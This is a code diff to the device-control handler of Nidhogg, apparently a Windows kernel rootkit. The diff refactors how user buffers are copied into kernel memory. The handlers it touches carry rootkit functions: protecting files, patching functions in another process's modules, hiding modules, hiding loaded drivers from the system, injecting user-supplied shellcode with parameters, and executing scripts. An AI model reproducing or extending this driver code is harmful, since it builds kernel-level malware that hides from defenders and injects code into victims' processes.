@@ -377,8 +377,6 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_PROTECT_UNPROTECT_FILE:
 	{
-		wchar_t* filePath = nullptr;
-
 		if (!Features.FileProtection) {
 			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
@@ -400,20 +398,14 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		MemoryAllocator<WCHAR*> allocator(&filePath, MAX_PATH * sizeof(WCHAR));
-		status = allocator.CopyData(data->FilePath, filePathLen * sizeof(WCHAR));
+		MemoryAllocator<WCHAR*> filePath(MAX_PATH * sizeof(WCHAR));
+		status = filePath.CopyData(data->FilePath, filePathLen * sizeof(WCHAR));
 
 		if (!NT_SUCCESS(status))
 			break;
 
-		if (!filePath) {
-			Print(DRIVER_PREFIX "Buffer data is invalid.\n");
-			status = STATUS_INVALID_PARAMETER;
-			break;
-		}
-
 		if (data->Protect) {
-			if (!NidhoggFileHandler->ProtectFile(filePath)) {
+			if (!NidhoggFileHandler->ProtectFile(filePath.Get())) {
 				Print(DRIVER_PREFIX "Failed to add file.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
@@ -421,18 +413,18 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 			auto prevIrql = KeGetCurrentIrql();
 			KeLowerIrql(PASSIVE_LEVEL);
-			Print(DRIVER_PREFIX "Protected file %ws.\n", filePath);
+			Print(DRIVER_PREFIX "Protected file %ws.\n", filePath.Get());
 			KeRaiseIrql(prevIrql, &prevIrql);
 		}
 		else {
-			if (!NidhoggFileHandler->RemoveFile(filePath, FileType::Protected)) {
+			if (!NidhoggFileHandler->RemoveFile(filePath.Get(), FileType::Protected)) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
 
 			auto prevIrql = KeGetCurrentIrql();
 			KeLowerIrql(PASSIVE_LEVEL);
-			Print(DRIVER_PREFIX "Unprotected file %ws.\n", filePath);
+			Print(DRIVER_PREFIX "Unprotected file %ws.\n", filePath.Get());
 			KeRaiseIrql(prevIrql, &prevIrql);
 		}
 
@@ -698,24 +690,27 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		patchedModule.PatchLength = data->PatchLength;
 		SIZE_T strSize = strlen(data->FunctionName);
 
-		MemoryAllocator<CHAR*> functionNameAllocator(&patchedModule.FunctionName, strSize);
-		status = functionNameAllocator.CopyData(data->FunctionName, strSize);
+		MemoryAllocator<CHAR*> functionName(strSize);
+		status = functionName.CopyData(data->FunctionName, strSize);
 
 		if (!NT_SUCCESS(status))
 			break;
+		patchedModule.FunctionName = functionName.Get();
 
 		strSize = wcslen(data->ModuleName) * sizeof(WCHAR);
-		MemoryAllocator<WCHAR*> moduleNameAllocator(&patchedModule.ModuleName, strSize);
-		status = moduleNameAllocator.CopyData(data->ModuleName, strSize);
+		MemoryAllocator<WCHAR*> moduleName(strSize);
+		status = moduleName.CopyData(data->ModuleName, strSize);
 
 		if (!NT_SUCCESS(status))
 			break;
+		patchedModule.ModuleName = moduleName.Get();
 
-		MemoryAllocator<PVOID> patchAllocator(&patchedModule.Patch, data->PatchLength);
-		status = patchAllocator.CopyData(data->Patch, data->PatchLength);
+		MemoryAllocator<PVOID> patch(data->PatchLength);
+		status = patch.CopyData(data->Patch, data->PatchLength);
 
 		if (!NT_SUCCESS(status))
 			break;
+		patchedModule.Patch = patch.Get();
 
 		if (!IsValidPid(data->Pid)) {
 			Print(DRIVER_PREFIX "Invalid PID.\n");
@@ -761,11 +756,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		hiddenModule.Pid = data->Pid;
 		SIZE_T moduleNameSize = wcslen(data->ModuleName) * sizeof(WCHAR);
 
-		MemoryAllocator<WCHAR*> moduleNameAllocator(&hiddenModule.ModuleName, moduleNameSize);
-		status = moduleNameAllocator.CopyData(data->ModuleName, moduleNameSize);
+		MemoryAllocator<WCHAR*> moduleName(moduleNameSize);
+		status = moduleName.CopyData(data->ModuleName, moduleNameSize);
 
 		if (!NT_SUCCESS(status))
 			break;
+		hiddenModule.ModuleName = moduleName.Get();
 
 		if (!IsValidPid(hiddenModule.Pid)) {
 			Print(DRIVER_PREFIX "Buffer is invalid.\n");
@@ -800,7 +796,6 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_HIDE_UNHIDE_DRIVER:
 	{
-		wchar_t* driverName = nullptr;
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
 		if (size != sizeof(IoctlHiddenDriverInfo)) {
@@ -811,8 +806,8 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		auto data = static_cast<IoctlHiddenDriverInfo*>(Irp->AssociatedIrp.SystemBuffer);
 		SIZE_T driverNameSize = (wcslen(data->DriverName) + 1) * sizeof(WCHAR);
 
-		MemoryAllocator<WCHAR*> driverNameAllocator(&driverName, driverNameSize);
-		status = driverNameAllocator.CopyData(data->DriverName, driverNameSize);
+		MemoryAllocator<WCHAR*> driverName(driverNameSize);
+		status = driverName.CopyData(data->DriverName, driverNameSize);
 
 		if (!NT_SUCCESS(status)) {
 			Print(DRIVER_PREFIX "Buffer is invalid.\n");
@@ -820,39 +815,39 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		if (data->Hide) {
-			status = NidhoggMemoryHandler->HideDriver(driverName);
+			status = NidhoggMemoryHandler->HideDriver(driverName.Get());
 			auto prevIrql = KeGetCurrentIrql();
 
 			if (prevIrql != PASSIVE_LEVEL)
 				KeLowerIrql(PASSIVE_LEVEL);
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to hide driver %ws: (0x%08X)\n", driverName, status);
+				Print(DRIVER_PREFIX "Failed to hide driver %ws: (0x%08X)\n", driverName.Get(), status);
 
 				if (prevIrql != PASSIVE_LEVEL)
 					KeRaiseIrql(prevIrql, &prevIrql);
 				break;
 			}
-			Print(DRIVER_PREFIX "Hid driver %ws.\n", driverName);
+			Print(DRIVER_PREFIX "Hid driver %ws.\n", driverName.Get());
 
 			if (prevIrql != PASSIVE_LEVEL)
 				KeRaiseIrql(prevIrql, &prevIrql);
 		}
 		else {
-			status = NidhoggMemoryHandler->UnhideDriver(driverName);
+			status = NidhoggMemoryHandler->UnhideDriver(driverName.Get());
 			auto prevIrql = KeGetCurrentIrql();
 
 			if (prevIrql != PASSIVE_LEVEL)
 				KeLowerIrql(PASSIVE_LEVEL);
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to restore driver %ws: (0x%08X)\n", driverName, status);
+				Print(DRIVER_PREFIX "Failed to restore driver %ws: (0x%08X)\n", driverName.Get(), status);
 
 				if (prevIrql != PASSIVE_LEVEL)
 					KeRaiseIrql(prevIrql, &prevIrql);
 				break;
 			}
-			Print(DRIVER_PREFIX "Restored driver %ws.\n", driverName);
+			Print(DRIVER_PREFIX "Restored driver %ws.\n", driverName.Get());
 
 			if (prevIrql != PASSIVE_LEVEL)
 				KeRaiseIrql(prevIrql, &prevIrql);
@@ -888,35 +883,39 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		shellcodeInfo.Parameter3 = NULL;
 		shellcodeInfo.Parameter3Size = data->Parameter3Size;
 
-		MemoryAllocator<PVOID> shellcodeAllocator(&shellcodeInfo.Shellcode, shellcodeInfo.ShellcodeSize);
-		status = shellcodeAllocator.CopyData(data->Shellcode, shellcodeInfo.ShellcodeSize);
+		MemoryAllocator<PVOID> shellcode(shellcodeInfo.ShellcodeSize);
+		status = shellcode.CopyData(data->Shellcode, shellcodeInfo.ShellcodeSize, UserMode);
 
 		if (!NT_SUCCESS(status))
 			break;
+		shellcodeInfo.Shellcode = shellcode.Get();
 
 		// Copy parameters
 		if (shellcodeInfo.Parameter1Size > 0) {
-			MemoryAllocator<PVOID> parameter1Alloc(&shellcodeInfo.Parameter1, shellcodeInfo.Parameter1Size);
-			status = parameter1Alloc.CopyData(data->Parameter1, shellcodeInfo.Parameter1Size);
+			MemoryAllocator<PVOID> parameter1(shellcodeInfo.Parameter1Size);
+			status = parameter1.CopyData(data->Parameter1, shellcodeInfo.Parameter1Size, UserMode);
 
 			if (!NT_SUCCESS(status))
 				break;
+			shellcodeInfo.Parameter1 = parameter1.Get();
 		}
 
 		if (shellcodeInfo.Parameter2Size > 0) {
-			MemoryAllocator<PVOID> parameter2Alloc(&shellcodeInfo.Parameter2, shellcodeInfo.Parameter2Size);
-			status = parameter2Alloc.CopyData(data->Parameter2, shellcodeInfo.Parameter2Size);
+			MemoryAllocator<PVOID> parameter2(shellcodeInfo.Parameter2Size);
+			status = parameter2.CopyData(data->Parameter2, shellcodeInfo.Parameter2Size, UserMode);
 
 			if (!NT_SUCCESS(status))
 				break;
+			shellcodeInfo.Parameter2 = parameter2.Get();
 		}
 
 		if (shellcodeInfo.Parameter3Size > 0) {
-			MemoryAllocator<PVOID> parameter3Alloc(&shellcodeInfo.Parameter3, shellcodeInfo.Parameter3Size);
-			status = parameter3Alloc.CopyData(data->Parameter3, shellcodeInfo.Parameter3Size);
+			MemoryAllocator<PVOID> parameter3(shellcodeInfo.Parameter3Size);
+			status = parameter3.CopyData(data->Parameter3, shellcodeInfo.Parameter3Size);
 
 			if (!NT_SUCCESS(status))
 				break;
+			shellcodeInfo.Parameter3 = parameter3.Get();
 		}
 
 		switch (shellcodeInfo.Type) {
@@ -1334,11 +1333,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		scriptInfo.ScriptSize = data->ScriptSize;
-		MemoryAllocator<PVOID> scriptAllocator(&scriptInfo.Script, scriptInfo.ScriptSize);
-		status = scriptAllocator.CopyData(data->Script, scriptInfo.ScriptSize);
+		MemoryAllocator<PVOID> script(scriptInfo.ScriptSize);
+		status = script.CopyData(data->Script, scriptInfo.ScriptSize);
 
 		if (!NT_SUCCESS(status))
 			break;
+		scriptInfo.Script = script.Get();
 
 		__try {
 			scriptManager = new ScriptManager();
